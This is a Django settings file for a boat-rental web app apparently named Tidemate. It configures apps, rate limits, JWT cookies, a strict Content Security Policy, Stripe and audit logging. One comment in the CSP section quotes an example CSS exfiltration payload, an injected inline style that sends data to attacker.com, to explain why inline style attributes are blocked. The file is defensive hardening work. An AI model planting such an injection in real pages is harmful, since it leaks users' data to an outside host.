import hashlib
import os
from pathlib import Path
from datetime import timedelta

from django.core.exceptions import ImproperlyConfigured
from dotenv import load_dotenv
import dj_database_url

BASE_DIR = Path(__file__).resolve().parents[2]

load_dotenv(BASE_DIR / ".env")


def env_bool(name: str, default: bool = False) -> bool:
    return os.getenv(name, str(default)).strip().lower() in {"1", "true", "yes", "on"}


def env_int(name: str, default: int) -> int:
    raw_value = os.getenv(name, str(default)).strip()

    try:
        return int(raw_value)
    except ValueError:
        raise ImproperlyConfigured(f"{name} must be an integer.")


def env_float(name: str, default: float) -> float:
    raw_value = os.getenv(name, str(default)).strip()

    try:
        return float(raw_value)
    except ValueError:
        raise ImproperlyConfigured(f"{name} must be a number.")


def env_list(name: str, default: str = "") -> list[str]:
    value = os.getenv(name, default)
    return [item.strip() for item in value.split(",") if item.strip()]


DEFAULT_DEV_SECRET_KEY = "dev-only-" + hashlib.sha256(str(BASE_DIR).encode("utf-8")).hexdigest()
SECRET_KEY = os.getenv("SECRET_KEY", DEFAULT_DEV_SECRET_KEY)
DEBUG = env_bool("DEBUG", False)

DJANGO_SETTINGS_MODULE = os.getenv("DJANGO_SETTINGS_MODULE", "")
IS_PRODUCTION_SETTINGS = DJANGO_SETTINGS_MODULE.endswith(".prod")

if IS_PRODUCTION_SETTINGS and SECRET_KEY == DEFAULT_DEV_SECRET_KEY:
    raise ImproperlyConfigured("SECRET_KEY must be set to a real value in production.")

LOCATION_PRIVACY_SALT = os.getenv("LOCATION_PRIVACY_SALT", "")

if not LOCATION_PRIVACY_SALT:
    if IS_PRODUCTION_SETTINGS:
        raise ImproperlyConfigured("LOCATION_PRIVACY_SALT must be set in production.")

    LOCATION_PRIVACY_SALT = (
        "dev-only-location-privacy-"
        + hashlib.sha256(str(BASE_DIR).encode("utf-8")).hexdigest()
    )

if IS_PRODUCTION_SETTINGS and len(LOCATION_PRIVACY_SALT) < 32:
    raise ImproperlyConfigured("LOCATION_PRIVACY_SALT must be at least 32 characters in production.")

ALLOWED_HOSTS = env_list("ALLOWED_HOSTS", "127.0.0.1,localhost")

INSTALLED_APPS = [
    "django.contrib.admin",
    "django.contrib.auth",
    "django.contrib.contenttypes",
    "django.contrib.sessions",
    "django.contrib.messages",
    "django.contrib.staticfiles",

    "corsheaders",
    "rest_framework",
    "rest_framework_simplejwt.token_blacklist",
    "channels",

    "users",
    "listings",
    "bookings",
    "payments",
    "notifications",
    "chat",
    "reviews",
    "favorites",
    "geocoding",
    "audit",
    "reports",
    "moderation",
]

MIDDLEWARE = [
    "corsheaders.middleware.CorsMiddleware",
    "django.middleware.security.SecurityMiddleware",
    "audit.middleware.RequestMonitoringMiddleware",
    "config.security_headers.ContentSecurityPolicyMiddleware",
    "django.contrib.sessions.middleware.SessionMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.contrib.auth.middleware.AuthenticationMiddleware",
    "django.contrib.messages.middleware.MessageMiddleware",
    "django.middleware.clickjacking.XFrameOptionsMiddleware",
]

ROOT_URLCONF = "config.urls"

ASGI_APPLICATION = "config.asgi.application"
WSGI_APPLICATION = "config.wsgi.application"

TEMPLATES = [
    {
        "BACKEND": "django.template.backends.django.DjangoTemplates",
        "DIRS": [],
        "APP_DIRS": True,
        "OPTIONS": {
            "context_processors": [
                "django.template.context_processors.request",
                "django.contrib.auth.context_processors.auth",
                "django.contrib.messages.context_processors.messages",
            ],
        },
    },
]

DATABASE_URL = os.getenv("DATABASE_URL", f"sqlite:///{BASE_DIR / 'db.sqlite3'}")

DATABASES = {
    "default": dj_database_url.parse(DATABASE_URL, conn_max_age=600)
}

AUTH_PASSWORD_VALIDATORS = [
    {
        "NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator",
    },
    {
        "NAME": "django.contrib.auth.password_validation.MinimumLengthValidator",
        "OPTIONS": {"min_length": 8},
    },
    {
        "NAME": "django.contrib.auth.password_validation.CommonPasswordValidator",
    },
    {
        "NAME": "django.contrib.auth.password_validation.NumericPasswordValidator",
    },
]

LANGUAGE_CODE = "en-us"
TIME_ZONE = "UTC"
USE_I18N = True
USE_TZ = True

STATIC_URL = "static/"
STATIC_ROOT = BASE_DIR / "staticfiles"

MEDIA_URL = "/media/"

MEDIA_ROOT_ENV = os.getenv("MEDIA_ROOT", "media")
MEDIA_ROOT = Path(MEDIA_ROOT_ENV)

if not MEDIA_ROOT.is_absolute():
    MEDIA_ROOT = BASE_DIR / MEDIA_ROOT


DATA_UPLOAD_MAX_MEMORY_SIZE = env_int(
    "DATA_UPLOAD_MAX_MEMORY_SIZE",
    10 * 1024 * 1024,
)

FILE_UPLOAD_MAX_MEMORY_SIZE = env_int(
    "FILE_UPLOAD_MAX_MEMORY_SIZE",
    5 * 1024 * 1024,
)

DATA_UPLOAD_MAX_NUMBER_FILES = env_int(
    "DATA_UPLOAD_MAX_NUMBER_FILES",
    12,
)

DATA_UPLOAD_MAX_NUMBER_FIELDS = env_int(
    "DATA_UPLOAD_MAX_NUMBER_FIELDS",
    200,
)

DEFAULT_AUTO_FIELD = "django.db.models.BigAutoField"

DEBUG_LINKS_ENABLED = env_bool("DEBUG_LINKS_ENABLED", False)

ADMIN_URL = os.getenv("DJANGO_ADMIN_URL", "admin/").strip().strip("/")

if not ADMIN_URL:
    ADMIN_URL = "admin"

ADMIN_URL = f"{ADMIN_URL}/"

LISTING_SEARCH_MAX_LIMIT = env_int("LISTING_SEARCH_MAX_LIMIT", 48)
LISTING_SEARCH_MAX_RADIUS_KM = env_float("LISTING_SEARCH_MAX_RADIUS_KM", 500.0)
LISTING_SEARCH_FALLBACK_MIN_CANDIDATES = env_int(
    "LISTING_SEARCH_FALLBACK_MIN_CANDIDATES",
    48,
)
LISTING_SEARCH_FALLBACK_MAX_CANDIDATES = env_int(
    "LISTING_SEARCH_FALLBACK_MAX_CANDIDATES",
    250,
)

LISTING_SEARCH_PUBLIC_RADIUS_MIN_CANDIDATES = env_int(
    "LISTING_SEARCH_PUBLIC_RADIUS_MIN_CANDIDATES",
    LISTING_SEARCH_FALLBACK_MIN_CANDIDATES,
)
LISTING_SEARCH_PUBLIC_RADIUS_MAX_CANDIDATES = env_int(
    "LISTING_SEARCH_PUBLIC_RADIUS_MAX_CANDIDATES",
    LISTING_SEARCH_FALLBACK_MAX_CANDIDATES,
)

GEOCODING_PROVIDER_BASE_URL = os.getenv(
    "GEOCODING_PROVIDER_BASE_URL",
    "https://nominatim.openstreetmap.org",
)

GEOCODING_PROVIDER_USER_AGENT = os.getenv(
    "GEOCODING_PROVIDER_USER_AGENT",
    "Tidemate/1.0 (private project)",
)



GEOCODING_COUNTRY_CODES = env_list("GEOCODING_COUNTRY_CODES", "no")
GEOCODING_SEARCH_LIMIT = env_int("GEOCODING_SEARCH_LIMIT", 5)
GEOCODING_QUERY_MAX_LENGTH = env_int("GEOCODING_QUERY_MAX_LENGTH", 120)
GEOCODING_TIMEOUT_SECONDS = env_float("GEOCODING_TIMEOUT_SECONDS", 4.0)
GEOCODING_SEARCH_CACHE_SECONDS = env_int("GEOCODING_SEARCH_CACHE_SECONDS", 86400)
GEOCODING_REVERSE_CACHE_SECONDS = env_int("GEOCODING_REVERSE_CACHE_SECONDS", 604800)

CORS_ALLOWED_ORIGINS = env_list(
    "CORS_ALLOWED_ORIGINS",
    "http://localhost:5173,http://127.0.0.1:5173",
)

_num_proxies_raw = os.getenv("NUM_PROXIES", "").strip()
_NUM_PROXIES = int(_num_proxies_raw) if _num_proxies_raw != "" else None

REST_FRAMEWORK = {
    "NUM_PROXIES": _NUM_PROXIES,
    "DEFAULT_PERMISSION_CLASSES": [
        "rest_framework.permissions.IsAuthenticated",
    ],
    "DEFAULT_AUTHENTICATION_CLASSES": [
        "config.authentication.CookieJWTAuthentication",
    ],
    "DEFAULT_THROTTLE_CLASSES": [
        "rest_framework.throttling.AnonRateThrottle",
        "rest_framework.throttling.UserRateThrottle",
    ],
    "DEFAULT_THROTTLE_RATES": {
        "anon": os.getenv("GLOBAL_ANON_RATE", "1000/hour"),
        "user": os.getenv("GLOBAL_USER_RATE", "5000/hour"),

        "auth_anon": "20/minute",
        "auth_user": "60/minute",
        "chat": "30/minute",
        "reviews": "10/hour",
        "booking_write": "20/hour",
        "listing_write": "30/hour",
        "profile_write": "20/hour",
        "public_listings_anon": "120/hour",
        "public_profile_anon": "120/hour",
        "moderation": os.getenv("MODERATION_RATE", "120/hour"),
        "reports": os.getenv("REPORT_RATE", "10/hour"),
        "boat_conditions_anon": os.getenv("BOAT_CONDITIONS_ANON_RATE", "30/hour"),
        "boat_conditions_user": os.getenv("BOAT_CONDITIONS_USER_RATE", "120/hour"),
        "boat_conditions_global": os.getenv("BOAT_CONDITIONS_GLOBAL_RATE", "300/hour"),
        "login_anon_identity": "50/15minutes",
        "login_user_identity": "100/15minutes",
        "login_ip": "20/10minutes",
        "signup_ip": "10/hour",
        "resend_verification_ip": "10/hour",
        "forgot_password_ip": "10/hour",  # pragma: allowlist secret
        "signup_anon_identity": "3/hour",
        "signup_user_identity": "5/hour",
        "resend_verification_anon_identity": "5/hour",
        "resend_verification_user_identity": "10/hour",  # pragma: allowlist secret
        "forgot_password_anon_identity": "5/hour",  # pragma: allowlist secret
        "forgot_password_user_identity": "10/hour",  # pragma: allowlist secret
        "verify_email": "20/hour",
        "reset_password": "20/hour",  # pragma: allowlist secret
        "change_password": "10/hour",  # pragma: allowlist secret
        "relationship_write": "60/hour",
        "geocoding": os.getenv("GEOCODING_RATE", "60/hour"),
    },
}

CORS_ALLOW_CREDENTIALS = True

WEBSOCKET_ALLOWED_ORIGINS = env_list(
    "WEBSOCKET_ALLOWED_ORIGINS",
    ",".join(CORS_ALLOWED_ORIGINS),
)

CSP_ENABLED = env_bool("CSP_ENABLED", IS_PRODUCTION_SETTINGS)

# Useful when testing CSP changes in production:
# True  = browser reports violations but does not block them
# False = browser blocks violations
CSP_REPORT_ONLY = env_bool("CSP_REPORT_ONLY", False)

CSP_SCRIPT_SRC_EXTRA = env_list("CSP_SCRIPT_SRC_EXTRA", "")
CSP_STYLE_SRC_EXTRA = env_list("CSP_STYLE_SRC_EXTRA", "")
CSP_CONNECT_SRC_EXTRA = env_list("CSP_CONNECT_SRC_EXTRA", "")
CSP_IMG_SRC_EXTRA = env_list("CSP_IMG_SRC_EXTRA", "")
CSP_FRAME_SRC_EXTRA = env_list("CSP_FRAME_SRC_EXTRA", "")

CSP_POLICY = {
    "default-src": ["'self'"],
    "base-uri": ["'self'"],
    "object-src": ["'none'"],

    # Important XSS hardening:
    # No "'unsafe-inline'" here.
    "script-src": ["'self'", *CSP_SCRIPT_SRC_EXTRA],
    "script-src-elem": ["'self'", *CSP_SCRIPT_SRC_EXTRA],
    "script-src-attr": ["'none'"],

    # 'unsafe-inline' is kept in style-src to cover <style> blocks used by
    # Django admin and browser-injected UI (e.g. autofill overlays).
    # Leaflet positions its tiles and markers via JavaScript (element.style.xxx),
    # which is a script operation and is NOT governed by style-src at all.
    #
    # style-src-attr: 'none' overrides 'unsafe-inline' specifically for inline
    # style="" attributes in HTML markup. This closes the CSS exfiltration vector
    # (e.g. an injected <div style="background:url(https://attacker.com?q=...)">)
    # without affecting <style> blocks or JS-set styles.
    "style-src": [
        "'self'",
        "'unsafe-inline'",
        "https://fonts.googleapis.com",
        *CSP_STYLE_SRC_EXTRA,
    ],
    "style-src-attr": ["'none'"],

    "font-src": ["'self'", "data:", "https://fonts.gstatic.com"],

    # img-src is intentionally scoped to known origins rather than the broad
    # "https:" wildcard. Leaflet loads OSM tiles from *.tile.openstreetmap.org.
    # Nominatim (geocoding) and the Met.no weather API do not serve images.
    # data: and blob: are required for Leaflet's canvas/marker rendering.
    #
    # If you add an external image CDN in future (e.g. for user-uploaded boat
    # photos served from S3/Cloudfront), add its origin to CSP_IMG_SRC_EXTRA
    # in your environment config rather than widening this back to "https:".
    "img-src": [
        "'self'",
        "data:",
        "blob:",
        "https://*.tile.openstreetmap.org",
        "https://tile.openstreetmap.org",
        *CSP_IMG_SRC_EXTRA,
    ],

    "connect-src": [
        "'self'",
        *CORS_ALLOWED_ORIGINS,
        *WEBSOCKET_ALLOWED_ORIGINS,
        *CSP_CONNECT_SRC_EXTRA,
    ],

    "frame-src": ["'self'", "https://www.openstreetmap.org", *CSP_FRAME_SRC_EXTRA],
    "form-action": ["'self'"],
    "frame-ancestors": ["'none'"],
}

if IS_PRODUCTION_SETTINGS:
    CSP_POLICY["upgrade-insecure-requests"] = True


CSRF_TRUSTED_ORIGINS = env_list(
    "CSRF_TRUSTED_ORIGINS",
    "http://localhost:5173,http://127.0.0.1:5173",
)


SIMPLE_JWT = {
    "ACCESS_TOKEN_LIFETIME": timedelta(minutes=15),
    "REFRESH_TOKEN_LIFETIME": timedelta(days=7),
    "ROTATE_REFRESH_TOKENS": True,
    "BLACKLIST_AFTER_ROTATION": True,
    "ISSUER": os.getenv("JWT_ISSUER", "tidemate-api"),
    "AUDIENCE": os.getenv("JWT_AUDIENCE", "tidemate-client"),
}


JWT_ACCESS_COOKIE_NAME = os.getenv("JWT_ACCESS_COOKIE_NAME", "access_token")
JWT_ACCESS_COOKIE_PATH = os.getenv("JWT_ACCESS_COOKIE_PATH", "/")
JWT_ACCESS_COOKIE_HTTPONLY = True
JWT_ACCESS_COOKIE_SECURE = env_bool("JWT_ACCESS_COOKIE_SECURE", not DEBUG)
JWT_ACCESS_COOKIE_SAMESITE = os.getenv("JWT_ACCESS_COOKIE_SAMESITE", "Lax")
JWT_ACCESS_COOKIE_MAX_AGE = int(SIMPLE_JWT["ACCESS_TOKEN_LIFETIME"].total_seconds())

JWT_REFRESH_COOKIE_NAME = os.getenv("JWT_REFRESH_COOKIE_NAME", "refresh_token")
JWT_REFRESH_COOKIE_PATH = os.getenv("JWT_REFRESH_COOKIE_PATH", "/api/users/")
JWT_REFRESH_COOKIE_HTTPONLY = True
JWT_REFRESH_COOKIE_SECURE = env_bool("JWT_REFRESH_COOKIE_SECURE", not DEBUG)
JWT_REFRESH_COOKIE_SAMESITE = os.getenv("JWT_REFRESH_COOKIE_SAMESITE", "Lax")

CHANNEL_LAYER_BACKEND = os.getenv(
    "CHANNEL_LAYER_BACKEND",
    "channels.layers.InMemoryChannelLayer",
)

CHANNEL_LAYERS = {
    "default": {
        "BACKEND": CHANNEL_LAYER_BACKEND,
    }
}

EMAIL_BACKEND = os.getenv(
    "EMAIL_BACKEND",
    "django.core.mail.backends.console.EmailBackend",
)

EMAIL_HOST = os.getenv("EMAIL_HOST", "localhost")
EMAIL_PORT = env_int("EMAIL_PORT", 25)
EMAIL_HOST_USER = os.getenv("EMAIL_HOST_USER", "")
EMAIL_HOST_PASSWORD = os.getenv("EMAIL_HOST_PASSWORD", "")
EMAIL_USE_TLS = env_bool("EMAIL_USE_TLS", False)
EMAIL_USE_SSL = env_bool("EMAIL_USE_SSL", False)
EMAIL_TIMEOUT = env_int("EMAIL_TIMEOUT", 10)

if EMAIL_USE_TLS and EMAIL_USE_SSL:
    raise ImproperlyConfigured("EMAIL_USE_TLS and EMAIL_USE_SSL cannot both be enabled.")

STRIPE_SECRET_KEY = os.getenv("STRIPE_SECRET_KEY", "").strip()
STRIPE_WEBHOOK_SECRET = os.getenv("STRIPE_WEBHOOK_SECRET", "").strip()
STRIPE_CURRENCY = os.getenv("STRIPE_CURRENCY", "nok").strip().lower()
STRIPE_PAYMENT_DEADLINE_MINUTES = env_int("STRIPE_PAYMENT_DEADLINE_MINUTES", 60)
DEFAULT_FROM_EMAIL = os.getenv("DEFAULT_FROM_EMAIL", "noreply@tidemate.local")
FRONTEND_URL = os.getenv("FRONTEND_URL", "http://localhost:5173").rstrip("/")
GOOGLE_OAUTH_CLIENT_ID = os.getenv("GOOGLE_OAUTH_CLIENT_ID", "").strip()
EMAIL_VERIFICATION_MAX_AGE_SECONDS = int(
    os.getenv("EMAIL_VERIFICATION_MAX_AGE_SECONDS", str(60 * 60 * 24))
)

MARINE_CONDITIONS_CACHE_TTL_SECONDS = env_int(
    "MARINE_CONDITIONS_CACHE_TTL_SECONDS",
    30 * 60,
)

MARINE_CONDITIONS_REQUEST_TIMEOUT_SECONDS = env_float(
    "MARINE_CONDITIONS_REQUEST_TIMEOUT_SECONDS",
    6.0,
)

MET_NORWAY_USER_AGENT = os.getenv(
    "MET_NORWAY_USER_AGENT",
    "TideMate/1.0 local-development",
)


# Monitoring / audit logging
LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
SECURITY_LOG_LEVEL = os.getenv("SECURITY_LOG_LEVEL", "INFO")

REQUEST_MONITORING_LOG_ENABLED = env_bool("REQUEST_MONITORING_LOG_ENABLED", True)
AUDIT_LOGGING_ENABLED = env_bool("AUDIT_LOGGING_ENABLED", True)
AUDIT_AUTOMATIC_API_EVENTS_ENABLED = env_bool("AUDIT_AUTOMATIC_API_EVENTS_ENABLED", True)

# Number of trusted reverse proxies in front of Django.
# Keep 0 for local development.
# Set to 1 if Django is behind one trusted reverse proxy like Nginx.
AUDIT_TRUSTED_PROXY_COUNT = env_int("AUDIT_TRUSTED_PROXY_COUNT", 0)

# Refresh is intentionally excluded from this list so that failures (4xx/5xx)
# are still audited — a spike of failed refreshes from an unusual IP can indicate
# a stolen token being replayed. Successful refreshes are suppressed in the
# middleware itself to avoid noise. See audit/middleware.py _should_audit().
AUDIT_SKIP_PATH_PREFIXES = env_list(
    "AUDIT_SKIP_PATH_PREFIXES",
    "/api/users/health/,/api/users/csrf/",
)

LOGGING = {
    "version": 1,
    "disable_existing_loggers": False,
    "formatters": {
        "json": {
            "()": "config.logging.JsonFormatter",
        },
        "console": {
            "format": "[{levelname}] {name}: {message}",
            "style": "{",
        },
    },
    "handlers": {
        "console_json": {
            "class": "logging.StreamHandler",
            "formatter": "json",
        },
        "console_plain": {
            "class": "logging.StreamHandler",
            "formatter": "console",
        },
    },
    "root": {
        "handlers": ["console_json"],
        "level": LOG_LEVEL,
    },
    "loggers": {
        "django": {
            "handlers": ["console_json"],
            "level": LOG_LEVEL,
            "propagate": False,
        },
        "django.request": {
            "handlers": ["console_json"],
            "level": "WARNING",
            "propagate": False,
        },
        "monitoring.requests": {
            "handlers": ["console_json"],
            "level": LOG_LEVEL,
            "propagate": False,
        },
        "security": {
            "handlers": ["console_json"],
            "level": SECURITY_LOG_LEVEL,
            "propagate": False,
        },
        "audit": {
            "handlers": ["console_json"],
            "level": LOG_LEVEL,
            "propagate": False,
        },
    },
}